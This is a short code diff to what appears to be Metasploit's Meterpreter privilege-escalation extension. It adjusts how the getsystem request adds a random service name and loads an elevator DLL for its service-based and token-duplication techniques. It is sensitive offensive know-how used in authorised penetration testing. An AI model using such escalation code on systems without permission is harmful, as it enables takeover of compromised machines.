@@ -25,7 +25,7 @@ class Priv < Extension
   end
 
   #
-  # Initializes the privilege escalationextension.
+  # Initializes the privilege escalation extension.
   #
   def initialize(client)
     super(client, 'priv')
@@ -48,12 +48,15 @@ class Priv < Extension
   def getsystem(technique=0)
     request = Packet.create_request(COMMAND_ID_PRIV_ELEVATE_GETSYSTEM)
 
+    # All three (that's #1, #2, #3 and *all* / #0) of the service-based techniques need a service name parameter
+    if [0, 1, 2, 3].include?(technique)
+      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_NAME, Rex::Text.rand_text_alpha_lower(6))
+    end
+
     # We only need the elevate DLL for when we're invoking the tokendup
     # method, which we'll only use if required (ie. trying all or when
     # that method is asked for explicitly)
-    if [0, 3].include?(technique)
-      elevator_name = Rex::Text.rand_text_alpha_lower(6)
-
+    if [0, 2, 3].include?(technique)
       elevator_path = nil
       client.binary_suffix.each { |s|
         elevator_path = MetasploitPayloads.meterpreter_path('elevator', s)
@@ -75,7 +78,6 @@ class Priv < Extension
         elevator_data += f.read(f.stat.size)
       }
 
-      request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_NAME, elevator_name)
       request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_DLL, elevator_data)
       request.add_tlv(TLV_TYPE_ELEVATE_SERVICE_LENGTH, elevator_data.length)
     end
